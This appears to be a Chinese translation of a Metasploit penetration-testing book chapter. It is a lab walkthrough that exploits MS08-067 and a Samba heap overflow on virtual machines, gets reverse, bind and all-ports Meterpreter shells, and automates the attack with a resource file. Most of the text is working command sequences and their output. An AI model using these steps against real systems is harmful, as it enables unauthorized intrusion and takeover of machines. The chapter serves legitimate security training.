## 第五章。利用的乐趣

利用是许多安全专业人士职业生涯的巅峰。能够完全控制目标机器的能力是一种很棒的感觉，尽管可能有些令人恐惧。但是，尽管利用技术在这些年里有了相当大的进步，但各种系统和网络保护措施的采用使得成功进行基本利用变得越来越困难。在本章中，我们将转向更复杂的攻击方法，从 Metasploit 框架的命令行界面开始。本章中讨论的大多数攻击和定制化操作将在 *msfconsole*、*msfencode* 和 *msfpayload* 中进行。

在您开始利用系统之前，您需要了解一些关于渗透测试和利用的知识。在 第一章 中，您介绍了基本的渗透测试方法。在 第二章 中，您学习了框架的基础知识以及可以期待每个工具的功能。在 第三章 中，我们探讨了情报收集阶段，而在 第四章 中，您学习了漏洞扫描。

在本章中，我们关注利用的基础知识。我们的目标是让您熟悉框架中可用的不同命令，我们将在后面的章节中继续探讨这些命令。从现在开始，大多数攻击将通过 *msfconsole* 进行，您需要对 *msfconsole*、*msfpayload* 和 *msfencode* 有一个扎实的理解，才能充分利用本书的其余部分。

## 基本利用

Metasploit 框架包含数百个模块，几乎不可能记住它们全部。从 *msfconsole* 中运行 `show` 命令将显示框架中可用的每个模块，但您也可以通过显示以下章节中讨论的特定类型的模块来缩小搜索范围。

### msf> show exploits

在 *msfconsole* 中，利用针对您在渗透测试期间发现的漏洞进行操作。新的利用总是在被开发，列表将继续增长。此命令将显示框架中当前可用的每个利用。

### msf> show auxiliary

Metasploit 中的辅助模块可用于广泛的目的。它们可以作为扫描器、拒绝服务模块、模糊测试器等操作。此命令将显示它们并列出其功能。

### msf> show options

选项控制框架模块正常功能所需的各项设置。当您在选中模块时运行 `show options`，Metasploit 将仅显示适用于该特定模块的选项。在模块内部输入 `msf> show options` 时，将显示可用的全局选项——例如，您可以在执行攻击时将 `LogLevel` 设置为更详细。您还可以使用 `back` 命令在模块内部返回。

```
msf > `use windows/smb/ms08_067_netapi`
msf exploit(ms08_067_netapi) > `back`
msf >
```

`search` 命令对于查找特定的攻击、辅助模块或有效载荷非常有用。例如，如果你想对 SQL 进行攻击，你可以这样搜索 SQL：

```
msf > `search mssql`
[*] Searching loaded modules for pattern 'mssql'...

Auxiliary
=========

   Name                       Disclosure Date  Rank    Description
   ----                       ---------------  ----    -----------
   admin/mssql/mssql_enum                      normal
  Microsoft SQL Server Configuration
                                                         Enumerator
   admin/mssql/mssql_exec                      normal
  Microsoft SQL Server xp_cmdshell
                                                         Command Execution
   admin/mssql/mssql_idf                       normal
  Microsoft SQL Server - Interesting
                                                         Data Finder
   admin/mssql/mssql_sql                       normal
  Microsoft SQL Server Generic Query
   scanner/mssql/mssql_login                   normal  MSSQL Login Utility
   scanner/mssql/mssql_ping                    normal  MSSQL Ping Utility
Exploits

`. . . SNIP . . .`

msf >
```

或者，为了找到特定的 MS08-067 攻击（与臭名昭著的 Conficker 蠕虫相关的攻击，该蠕虫利用了远程过程调用 [RPC] 服务中的漏洞），你可以输入以下命令：

```
msf > `search ms08_067`
[*] Searching loaded modules for pattern 'ms08_067'...

Exploits
========

   Name                         Rank   Description
   ----                         ----   -----------
   `windows/smb/ms08_067_netapi`
  great  Microsoft Server Service Relative Path Stack Corruption
```

然后，找到攻击（*windows/smb/ms08_067_netapi*）后，你可以使用 `use` 命令加载找到的模块，如下所示：

```
msf > `use windows/smb/ms08_067_netapi`
msf exploit(ms08_067_netapi) >
```

注意当我们发出 `use windows/smb/ms08_067_netapi` 命令时，`msf` 提示符会如下改变：

```
msf exploit(ms08_067_netapi) >
```

这表示我们已经选择了 `ms08_067_netapi` 模块，并且在此提示符下发出的命令将在该攻击下执行。

* * *

### 注意

你可以在攻击过程中随时执行 `search` 或 `use` 命令来切换到不同的攻击或模块。

* * *

现在，提示符反映了我们选择的模块，我们可以输入 `show options` 来显示针对 MS08-067 攻击的特定选项：

```
msf exploit(ms08_067_netapi) > `show options`

Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting

msf exploit(ms08_067_netapi) >
```

这种基于上下文的方法访问选项，使得界面更简单，并允许你只关注当前重要的选项。

### msf> show payloads

回想一下 第二章，有效载荷是代码的平台特定部分，被发送到目标。与 `show options` 类似，当你从一个特定模块的提示符运行 `show payloads` 时，Metasploit 只会显示与该模块兼容的有效载荷。在基于 Microsoft Windows 的攻击中，这些有效载荷可能只是目标上的命令提示符，也可能是在目标机器上的完整图形界面。要查看活动有效载荷列表，请运行以下命令：

```
msf> `show payloads`
```

这将显示 Metasploit 中所有可用的有效载荷；然而，如果你正在进行实际的攻击，你将只会看到适用于该攻击的有效载荷。例如，从 `msf exploit(ms08_067_netapi)` 提示符运行 `show payloads` 命令将产生下面的输出。

在前面的例子中，我们搜索了 MS08-067 模块。现在，让我们通过输入 `show payloads` 来找出该模块的有效载荷。注意在示例中，只显示了基于 Windows 的有效载荷。Metasploit 通常会识别出可以与特定攻击一起使用的有效载荷类型。

```
msf exploit(ms08_067_netapi) > `show payloads`

Compatible Payloads
===================

Name                                             Rank    Description
----                                             ----    -----------

`. . . SNIP . . .`

windows/shell/reverse_ipv6_tcp                   normal
  Windows Command Shell, Reverse TCP
                                                           Stager (IPv6)
windows/shell/reverse_nonx_tcp                   normal
  Windows Command Shell, Reverse TCP
                                                           Stager (No NX or Win7)
windows/shell/reverse_ord_tcp                    normal
  Windows Command Shell, Reverse

                                                 Ordinal TCP Stager (No NX or Win7)
windows/shell/reverse_tcp                        normal
  Windows Command Shell, Reverse TCP
                                                           Stager
windows/shell/reverse_tcp_allports               normal
  Windows Command Shell, Reverse
                                                           All-Port TCP Stager
windows/shell_bind_tcp                           normal
  Windows Command Shell, Bind TCP
                                                           Inline
windows/shell_reverse_tcp                        normal
  Windows Command Shell, Reverse TCP
                                                           Inline
```

接下来，我们输入 `set payload windows/shell/reverse_tcp` 来选择 `reverse_tcp` 有效载荷。当我们再次输入 `show options` 时，我们会看到显示了一些额外的选项：

```
msf exploit(ms08_067_netapi) > `set payload windows/shell/reverse_tcp` 
  payload => windows/shell/reverse_tcp
  msf exploit(ms08_067_netapi) > `show options` 

  Module options:

     Name     Current Setting  Required  Description
     ----     ---------------  --------  -----------
     RHOST                     yes       The target address
     RPORT    445              yes       Set the SMB service port
     SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

   Payload options (windows/shell/reverse_tcp):

     Name      Current Setting  Required  Description
     ----      ---------------  --------  -----------
     EXITFUNC  thread           yes       Exit technique: seh, thread, process
     LHOST                      yes       The local address
     LPORT     4444             yes       The local port
```

注意，当在![图片](img/00002.gif)选择有效载荷并在![图片](img/00004.gif)显示选项时，我们在![图片](img/00005.gif)的有效载荷部分看到了一些额外的选项，例如`LHOST`和`LPORT`。在这个例子中，你可以配置有效载荷以连接到攻击者的机器上的特定 IP 地址和端口号，这被称为*反向有效载荷*。在反向有效载荷中，连接实际上是由目标机器触发的，并连接到攻击者。你可能使用这种技术来绕过防火墙或 NAT 安装。

我们将使用`LHOST`和`RHOST`选项来配置这个漏洞利用程序。`LHOST`，我们的攻击机，将从目标机器（`RHOST`）在默认 TCP 端口（4444）上回连。

### msf> show targets

模块通常会列出易受攻击的潜在目标。例如，由于 MS08-067 所针对的漏洞依赖于硬编码的内存地址，该漏洞利用程序仅针对具有特定补丁级别、语言版本和安全实现的操作系统（如第十四章创建自己的漏洞利用和第十五章将漏洞利用程序移植到 Metasploit 框架中详细解释）。在`msf MS08-067`提示符下使用`show targets`命令将显示 60 个漏洞利用目标列表（以下示例中只显示了部分）。漏洞利用的成功将取决于你针对的 Windows 版本。有时自动检测可能不起作用，甚至可能触发错误的漏洞利用，这通常会导致服务崩溃。

```
msf exploit(ms08_067_netapi) > `show targets`

  Exploit targets:

     Id  Name
   --  ----
    0   Automatic Targeting
     1   Windows 2000 Universal
     2   Windows XP SP0/SP1 Universal
     3   Windows XP SP2 English (NX)
     4   Windows XP SP3 English (NX)
     5   Windows 2003 SP0 Universal
     6   Windows 2003 SP1 English (NO NX)
     7   Windows 2003 SP1 English (NX)
     8   Windows 2003 SP2 English (NO NX)
     9   Windows 2003 SP2 English (NX)
```

在这个例子中，你可以看到漏洞利用列出了自动目标![图片](img/00002.gif)作为一个选项。通常，一个漏洞利用模块会尝试根据其版本自动针对操作系统，并根据系统的指纹选择一个漏洞利用。然而，最好还是尝试自己识别合适的漏洞利用，以避免触发错误的漏洞利用或潜在的破坏性漏洞利用。

* * *

### Note

这个特定的漏洞利用程序很情绪化，它在确定操作系统方面很困难。如果你使用这个漏洞利用程序，请确保将目标设置为你在 VM 上测试时使用的特定操作系统（Windows XP SP2）。

* * *

### info

当`show`和`search`命令提供的模块简短描述不足以说明时，请使用`info`命令后跟模块名称来显示该模块的所有信息、选项和目标：

```
msf exploit(ms08_067_netapi) > `info`
```

### set and unset

对于给定的 Metasploit 模块的所有选项都必须设置为已设置或未设置，特别是如果它们被标记为*必需*或*是*。当你输入`show options`时，你会看到指定字段是否必需的信息。使用`set`命令来设置一个选项（打开它）；使用`unset`来关闭设置。下面的列表显示了`set`和`unset`命令的使用情况。

* * *

### Note

注意，变量使用大写字母进行引用。这不是必需的，但被认为是良好的实践。

* * *

```
msf exploit(ms08_067_netapi) > `set RHOST 192.168.1.155` 
RHOST => 192.168.1.155
msf exploit(ms08_067_netapi) > `set TARGET 3` 
TARGET => 3
msf exploit(ms08_067_netapi) > `show options` 

Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.1.155    yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Exploit target:

   Id  Name
   --  ----
   3   Windows XP SP2 English (NX)

msf exploit(ms08_067_netapi) > unset RHOST
Unsetting RHOST...
```

在 ![](img/00002.gif) 我们将目标 IP 地址 (`RHOST`) 设置为 `192.168.1.155`（我们的目标机器）。在 ![](img/00004.gif) 我们 `set` 目标为 `3`，即我们在 msf> show targets 中用 `show targets` 列出的“Windows XP SP2 English (NX)”。在 ![](img/00005.gif) 运行 `show options` 确认我们的设置已被填充，如 `Module options` 输出所示。

### setg 和 unsetg

`setg` 和 `unsetg` 命令用于在 *msfconsole* 中全局设置或取消设置参数。使用这些命令可以避免您反复输入相同的信息，尤其是在经常使用且很少更改的选项（如 `LHOST`）的情况下。

### 保存

使用 `setg` 命令配置了全局选项后，使用 `save` 命令保存当前设置，以便下次运行控制台时可用。您可以在 Metasploit 中随时输入 `save` 命令来保存当前位置。

```
msf exploit(ms08_067_netapi) > `save`
Saved configuration to: /root/.msf3/config
msf exploit(ms08_067_netapi) >
```

存储配置的位置 */root/.msf3/config* 显示在屏幕上。如果出于某种原因您需要从头开始，移动或删除此文件以恢复默认设置。

## 利用第一台机器

在掌握了一些基础知识并了解了如何在 *msfconsole* 中设置变量之后，让我们来利用我们的第一台机器。为此，请启动您的 Windows XP Service Pack 2 和 Ubuntu 9.04 虚拟机。我们将在 Back|Track 中使用 Metasploit。

如果您在您的虚拟 Windows XP SP2 机器上使用了第四章中讨论的漏洞扫描器，您将遇到我们将在本章中利用的漏洞：MS08-067 漏洞利用程序。我们将首先在我们自己的机器上找到这个漏洞。

随着您作为渗透测试员技能的提高，某些开放端口的发现将激发您对如何利用特定服务的想法。进行此检查的最好方法之一是使用 Metasploit 中的 *nmap* 脚本选项，如下所示：

```
root@bt:/root# `cd /opt/framework3/msf3/`
root@bt:/opt/framework3/msf3# `msfconsole`

`. . . SNIP . . .`

msf > `nmap -sT -A --script=smb-check-vulns -P0 192.168.33.130` 
[*] exec: nmap -sT -A --script=smb-check-vulns -P0 192.168.33.130

Starting Nmap 5.20 ( http://nmap.org ) at 2011-03-15 19:46 EDT
Warning: Traceroute does not support idle or connect scan, disabling...
NSE: Script Scanning completed.
Nmap scan report for 192.168.33.130
Host is up (0.00050s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
25/tcp   open  smtp         Microsoft ESMTP 6.0.2600.2180
80/tcp   open  http         Microsoft IIS webserver 5.1
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn
443/tcp  open  https?
445/tcp  open  microsoft-ds Microsoft Windows XP microsoft-ds
1025/tcp open  msrpc        Microsoft Windows RPC
1433/tcp open  ms-sql-s     Microsoft SQL Server 2005 9.00.1399; RTM
MAC Address: 00:0C:29:EA:26:7C (VMware)
Device type: general purpose
Running: Microsoft Windows XP|2003
OS details: `Microsoft Windows XP Professional SP2 or Windows Server 2003` 
Network Distance: 1 hop
Service Info: Host: ihazsecurity; OS: Windows

Host script results:
 smb-check-vulns:
   `MS08-067: VULNERABLE` 
   Conficker: Likely CLEAN
   regsvc DoS: CHECK DISABLED (add '--script-args=unsafe=1' to run)
   SMBv2 DoS (CVE-2009-3103): CHECK DISABLED (add '--script-args=unsafe=1' to run)

OS and Service detection performed. Please report any incorrect
 results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.67 seconds
msf >
```

在这里，我们在 ![](img/00002.gif) 从 Metasploit 中调用 *nmap* 并使用 `--script=smb-check-vulns` 插件。注意在扫描主机时使用的标志。`-sT` 是一种隐秘的 TCP 连接，我们发现这是在尝试枚举端口时最可靠的标志。（其他人更喜欢 `-sS`，或隐秘的 Syn）。`-A` 指定高级操作系统检测，它为我们执行一些额外的服务标志抓取和特定服务的指纹。

注意到在 *nmap* 的结果中，在 ![](img/00004.gif) 报告了 `MS08-067: VULNERABLE`。这是一个好迹象，表明我们有机会利用这个系统。让我们使用 Metasploit 来找到我们想要的漏洞利用程序并尝试入侵系统。

此漏洞利用代码针对操作系统版本、服务包和系统上使用的语言是特定的，这是漏洞绕过数据执行保护（DEP）的结果。DEP 是为了帮助通过将堆栈设置为只读来防止缓冲区溢出攻击而创建的。然而，我们可以通过执行一些复杂的堆栈操作来绕过 DEP 并强制 Windows 使堆栈可写。（有关绕过 DEP 的更多信息，请参阅 [`www.uninformed.org/?v=2&a=4`](http://www.uninformed.org/?v=2&a=4)。）

在 msf> show targets 中，我们使用了 `show targets` 命令，该命令列出了针对此特定攻击向量的每个易受攻击的版本。由于 MS08-067 是一个非常具体地针对正在使用的 OS 版本的漏洞利用代码，我们将手动设置我们的目标以确保触发正确的溢出。根据前面示例中显示的 *nmap* 扫描结果，我们可以在 ![图片](img/00005.gif) 中判断该系统正在运行 Windows XP Service Pack 2。（它也被识别为可能是 Windows 2003，但该系统缺少与服务器版相关的关键端口。）我们将假设我们的目标是运行英语版本的 XP。

让我们通过实际利用过程来了解一下。首先，是设置：

```
msf > `search ms08_067_netapi` 
[*] Searching loaded modules for pattern 'ms08_067_netapi'...

Exploits
========

   Name                         Rank   Description
   ----                         ----   -----------
   windows/smb/ms08_067_netapi  great  Microsoft Server
 Service Relative Path Stack Corruption

msf > `use windows/smb/ms08_067_netapi` 
msf exploit(ms08_067_netapi) > `set PAYLOAD windows/meterpreter/reverse_tcp` 
payload => windows/meterpreter/reverse_tcp
msf exploit(ms08_067_netapi) > `show targets` 

Exploit targets:

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   `3   Windows XP SP2 English (NX)` 
   4   Windows XP SP3 English (NX)
   5   Windows 2003 SP0 Universal
   6   Windows 2003 SP1 English (NO NX)
   7   Windows 2003 SP1 English (NX)
   8   Windows 2003 SP2 English (NO NX)
   9   Windows 2003 SP2 English (NX)

`. . . SNIP . . .`

   26  Windows XP SP2 Japanese (NX)

`. . . SNIP . . .`

msf exploit(ms08_067_netapi) > `set TARGET 3`
target => 3
msf exploit(ms08_067_netapi) > `set RHOST 192.168.33.130` 
RHOST => 192.168.33.130
msf exploit(ms08_067_netapi) > `set LHOST 192.168.33.129` 
LHOST => 192.168.33.129
msf exploit(ms08_067_netapi) > `set LPORT 8080` 
LPORT => 8080
msf exploit(ms08_067_netapi) > `show options` 

Module options:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.33.130   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LHOST     192.168.33.129   yes       The local address
   LPORT     8080             yes       The local port

Exploit target:

   Id  Name
   --  ----
   3   Windows XP SP2 English (NX)
```

我们在 Framework 中搜索 MS08-067 NetAPI 漏洞利用代码，位置在 ![图片](img/00002.gif)。然后，找到我们的漏洞利用代码后，我们在 ![图片](img/00004.gif) 加载了 *windows/smb/ms08_067_netapi* 漏洞利用代码。

接下来，在 ![图片](img/00005.gif) 我们设置了载荷为基于 Windows 的 Meterpreter `reverse_tcp`，如果成功，将在目标机器上启动一个连接并连接回由 `LHOST` 指定的攻击机器。如果你发现防火墙已经设置，并且你需要绕过防火墙或 NAT 上的入站控制，这很重要。

*Meterpreter* 是一种后利用工具，我们将通过本书使用它。Metasploit 的旗舰工具之一，它使得提取信息或进一步损害系统变得容易得多。

在 ![图片](img/00006.gif) 的 `show targets` 命令允许我们识别我们想要攻击的系统。（尽管许多 MSF 漏洞利用代码使用自动定位且不需要此标志，但自动检测功能在 MS08-067 中通常失败。）

然后，我们在 ![图片](img/00007.gif) 将目标设置为 `Windows XP SP2 English (NX)`。`NX` 代表不执行。在 Windows XP SP2 中默认启用 DEP。

在 ![图片](img/00026.gif) 我们设置了目标机器的 IP 地址，通过定义 `RHOST` 值，该机器易受 MS08-067 漏洞利用。

在 ![](img/00027.gif) 处的 `set LHOST` 命令指定了我们的攻击机器的 IP 地址（Back|Track 机器），而 ![](img/00028.gif) 处的 `LPORT` 选项指定了我们的攻击机器将监听来自目标机器连接的端口。（当你设置 `LPORT` 选项时，使用你认为会被防火墙允许的标准端口：端口 443、80、53 和 8080 通常都是不错的选择。）最后，我们在 ![](img/00029.gif) 处输入 `show options` 以确保选项设置正确。

在设置好场景后，我们准备进行实际的攻击：

```
msf exploit(ms08_067_netapi) > `exploit` 
[*] Started reverse handler on 192.168.33.129:8080
[*] Triggering the vulnerability...
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:8080 -> 192.168.33.130:1487) 
msf exploit(ms08_067_netapi) > `sessions -l` 

Active sessions
===============

  Id  Type         Information  Connection
  --  ----         -----------  ----------
  1   meterpreter               192.168.33.129:8080 -> 192.168.33.130:1036 

msf exploit(ms08_067_netapi) > `sessions -i 1` 
[*] Starting interaction with 1...

meterpreter > `shell` 
Process 4060 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

在 ![](img/00002.gif) 处的 `exploit` 命令启动我们的攻击并尝试攻击目标。攻击成功并给我们一个在 ![](img/00004.gif) 处的 `reverse_tcp` Meterpreter 载荷，我们可以通过 `sessions -l` 在 ![](img/00005.gif) 处查看。只有一个会话是活跃的，如 ![](img/00006.gif) 所示，但如果我们针对多个系统，可能会有多个会话同时打开。（要查看创建每个会话的漏洞列表，你需要输入 `sessions -l -v`。）

在 ![](img/00007.gif) 处发出 `sessions -i 1` 命令以“交互”单个会话。注意这会让我们进入一个 Meterpreter shell。例如，如果存在反向命令 shell，此命令会直接将我们带到命令提示符。最后，在 ![](img/00026.gif) 处我们输入 `shell` 以跳入目标上的交互式命令 shell。

恭喜！你已经攻破了你的第一台机器！要列出特定漏洞可用的命令，你可以输入 `show options`。

## 攻击 Ubuntu 机器

让我们在 Ubuntu 9.04 虚拟机上尝试不同的漏洞。步骤与前面的漏洞基本相同，只是我们将选择不同的载荷。

```
msf > `nmap -sT -A -P0 192.168.33.132`
[*] exec: nmap -sT -A -P0 192.168.33.132

Starting Nmap 5.20 ( http://nmap.org ) at 2011-03-15 19:35 EDT
Warning: Traceroute does not support idle or connect scan, disabling...
Nmap scan report for 192.168.33.132
Host is up (0.00048s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
`80/tcp  open`  http        Apache httpd 2.2.3 ((`Ubuntu`) PHP/5.2.1) 
|_html-title: Index of /
`139/tcp open`  netbios-ssn `Samba` smbd 3.X (workgroup: MSHOME) 
`445/tcp open`  netbios-ssn `Samba` smbd 3.X (workgroup: MSHOME)
MAC Address: 00:0C:29:21:AD:08 (VMware)
No exact OS matches for host (If you know what OS is running
 on it, see http://nmap.org/submit/ ).

`. . . SNIP . . .`

Host script results:
|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
|_smbv2-enabled: Server doesn't support SMBv2 protocol
| smb-os-discovery:
|   OS: Unix (Samba 3.0.24)
|   Name: MSHOME\Unknown
|_  System time: 2011-03-15 17:39:57 UTC-4

OS and Service detection performed. Please report any incorrect
 results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.11 seconds
```

我们看到三个开放的端口：80、139 和 445。![](img/00002.gif) 处的消息告诉我们系统正在运行 Ubuntu，而 ![](img/00004.gif) 处我们看到它正在运行 Samba 3.*x* 和 Apache 2.2.3 以及 PHP 5.2.1 版本。

让我们搜索一个 Samba 漏洞并尝试在系统上应用它：

```
msf > `search samba`
[*] Searching loaded modules for pattern 'samba'...

Auxiliary
=========
   Name                               Rank    Description
   ----                               ----    -----------
   admin/smb/samba_symlink_traversal  normal  Samba Symlink Directory Traversal
   dos/samba/lsa_addprivs_heap        normal  Samba lsa_io_privilege_set Heap Overflow
   dos/samba/lsa_transnames_heap      normal  Samba lsa_io_trans_names Heap `Overflow`

Exploits
========

   Name                                 Rank       Description
   ----                                 ----       -----------
   `linux/samba/lsa_transnames_heap      good       Samba lsa_io_trans_names . . .`

`. . . SNIP . . .`

msf > `use linux/samba/lsa_transnames_heap`
msf exploit(lsa_transnames_heap) > `show payloads`
Compatible Payloads
===================

   Name                              Rank    Description
   ----                              ----    -----------
   generic/debug_trap                normal  Generic x86 Debug Trap
   generic/shell_bind_tcp            normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp         normal  Generic Command Shell, Reverse TCP Inline
   linux/x86/adduser                 normal  Linux Add User
   linux/x86/chmod                   normal  Linux Chmod
   linux/x86/exec                    normal  Linux Execute Command
   linux/x86/metsvc_bind_tcp         normal  Linux Meterpreter Service, Bind TCP
   linux/x86/metsvc_reverse_tcp      normal  Linux Meterpreter
 Service, Reverse TCP Inline
   linux/x86/shell/bind_ipv6_tcp     normal  Linux Command Shell,
 Bind TCP Stager (IPv6)
   linux/x86/shell/bind_tcp          normal  Linux Command Shell, Bind TCP Stager

`. . . SNIP . . .`

msf exploit(lsa_transnames_heap) > `set payload linux/x86/shell_bind_tcp`
payload => linux/x86/shell_bind_tcp
msf exploit(lsa_transnames_heap) > `set LPORT 8080`
LPORT => 8080
msf exploit(lsa_transnames_heap) > `set RHOST 192.168.33.132`
RHOST => 192.168.33.132
msf exploit(lsa_transnames_heap) > `exploit`

[*] Creating nop sled....
[*] Started bind handler
[*] Trying to exploit Samba with address 0xffffe410...
[*] Connecting to the SMB service...

`. . . SNIP . . .`

[*] Calling the vulnerable function...
[+] Server did not respond, this is expected
[*] Command shell session 1 opened (192.168.33.129:41551 -> 192.168.33.132:8080)
`ifconfig`
eth1      Link encap:Ethernet  HWaddr 00:0C:29:21:AD:08
          inet addr:192.168.33.132  Bcast:192.168.33.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3178 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2756 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:292351 (285.4 KiB)  TX bytes:214234 (209.2 KiB)
          Interrupt:17 Base address:0x2000

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)

`whoami`
root
```

这种类型的攻击，称为 *堆栈攻击*，利用动态内存分配，但并不总是 100%可靠。（如果第一次尝试不成功，你可能需要尝试几次 `exploit` 命令。）

注意在这个例子中，我们使用了一个 *bind* shell 在目标机器上设置监听端口；Metasploit 会自动为我们处理与系统的直接连接。（记住在通过防火墙或 NAT 攻击时使用反向载荷。）

## 全端口载荷：端口暴力破解

在前面的例子中，我们依赖于反向端口始终是开放的。但是，如果我们攻击的是一个对出口端口过滤非常严格的组织呢？大多数公司除了少数定义的端口外，都会阻止出站连接，确定哪些端口可以进行出站连接可能很困难。

我们可以猜测端口 443 不会被检查，并允许 TCP 连接出站，而 FTP、Telnet、SSH 和 HTTP 可能会被允许。但是，为什么猜测，当 Metasploit 有一个非常具体的有效载荷用于查找开放端口时？

Metasploit 的有效载荷将尝试所有可用的端口，直到找到一个开放的端口。（然而，遍历整个端口范围 [1–65535] 可能需要相当长的时间。）

让我们使用这个有效载荷，并尝试所有端口进行出站连接，直到我们找到一个成功的连接：

```
msf > `use windows/smb/ms08_067_netapi`
msf exploit(ms08_067_netapi) > `set LHOST 192.168.33.129`
lhost => 192.168.33.129
smsf exploit(ms08_067_netapi) > `set RHOST 192.168.33.130`
rhost => 192.168.33.130
msf exploit(ms08_067_netapi) > `set TARGET 3`
target => 3
msf exploit(ms08_067_netapi) > `search ports`
[*] Searching loaded modules for pattern 'ports'...

Compatible Payloads
===================

   Name                                       Rank    Description
   ----                                       ----    -----------
   windows/dllinject/reverse_tcp_allports     normal  Reflective Dll Injection,
                                                        Reverse All-Port TCP Stager
   windows/meterpreter/reverse_tcp_allports   normal  Windows Meterpreter (Reflective

       Injection), Reverse All-Port TCP Stager

`. . . SNIP . . .`

msf exploit(ms08_067_netapi) > `set PAYLOAD windows/meterpreter/reverse_tcp_allports`
payload => windows/meterpreter/reverse_tcp_allports
msf exploit(ms08_067_netapi) > `exploit -j`
[*] Exploit running as background job.
msf exploit(ms08_067_netapi) >
[*] Started reverse handler on 192.168.33.129:1 
[*] Triggering the vulnerability...
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:1 -> 192.168.33.130:1047) 

msf exploit(ms08_067_netapi) > `sessions -l -v`

Active sessions
===============

  Id  Type         Information
                Connection                               Via
  --  ----         -----------
                        ----------                               ---
  1   meterpreter  NT AUTHORITY\SYSTEM @ IHAZSECURITY  192.
168.33.129:1 -> 192.168.33.130:1047

    exploit/windows/smb/ms08_067_netapi

msf exploit(ms08_067_netapi) > `sessions -i 1`
[*] Starting interaction with 1...

meterpreter >
```

注意，我们没有设置 `LPORT`；相反，我们使用 `allports`，因为我们打算尝试在每个端口上连接出网络，直到找到一个开放的端口。如果你仔细查看 ![](img/00002.gif)，你会看到我们的攻击机绑定到 `:1`（所有端口），并且它在目标网络上的端口 1047 找到了一个出站端口 ![](img/00004.gif)。

## 资源文件

*资源文件* 是脚本文件，用于在 *msfconsole* 中自动化命令。它们包含从 *msfconsole* 执行并按顺序运行的命令列表。资源文件可以大大减少测试和开发时间，允许你自动化许多重复性任务，包括漏洞利用。

资源文件可以通过 `resource` 命令从 *msfconsole* 加载，或者可以通过 `-r` 开关作为命令行参数传递。

下面的简单示例创建了一个资源文件，显示我们的 Metasploit 版本，然后加载声音插件：

```
root@bt:/opt/framework3/msf3/ `echo version > resource.rc` 
  root@bt:/opt/framework3/msf3/ `echo load sounds >> resource.rc` 
  root@bt:/opt/framework3/msf3/ `msfconsole -r resource.rc` 
 resource (resource.rc)> version
  Framework: 3.7.0-dev.12220
  Console  : 3.7.0-dev.12220
  resource (resource.rc)> load sounds
  [*] Successfully loaded plugin: sounds
  msf >
```

如 ![](img/00002.gif) 和 ![](img/00004.gif) 所示，`version` 和 `load sounds` 命令被回显到一个名为 *resource.rc* 的文本文件中。然后，该文件通过命令行在 ![](img/00005.gif) 处使用 `-r` 开关传递给 *msfconsole*，当文件开始加载时，命令从资源文件中执行 ![](img/00006.gif)。

一个更复杂的资源文件可能会自动运行针对实验室环境中机器的特定漏洞利用。例如，以下列表使用一个名为 *autoexploit.rc* 的新创建的资源文件中的 SMB 漏洞利用。我们在一个文件中设置有效载荷和我们的攻击和目标 IP，这样在尝试此漏洞利用时就不必手动指定这些选项。

```
root@bt:/opt/framework3/msf3/
`echo use exploit/windows/smb/ms08_067_netapi > autoexploit.rc`
root@bt:/opt/framework3/msf3/ `echo set RHOST 192.168.1.155 >> autoexploit.rc`
root@bt:/opt/framework3/msf3/
 `echo set PAYLOAD windows/meterpreter/reverse_tcp >> autoexploit.rc`
root@bt:/opt/framework3/msf3/ `echo set LHOST 192.168.1.101 >> autoexploit.rc`
root@bt:/opt/framework3/msf3/ `echo exploit >> autoexploit.rc`
root@bt:/opt/framework3/msf3/ `msfconsole`
msf > `resource autoexploit.rc`
resource (autoexploit.rc)> use exploit/windows/smb/ms08_067_netapi
resource (autoexploit.rc)> set RHOST 192.168.1.155
RHOST => 192.168.1.155
resource (autoexploit.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (autoexploit.rc)> set LHOST 192.168.1.101
LHOST => 192.168.1.101
resource (autoexploit.rc)> exploit

[*] Started reverse handler on 192.168.1.101:4444
[*] Triggering the vulnerability...
[*] Sending stage (747008 bytes)
[*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.155:1033)

meterpreter >
```

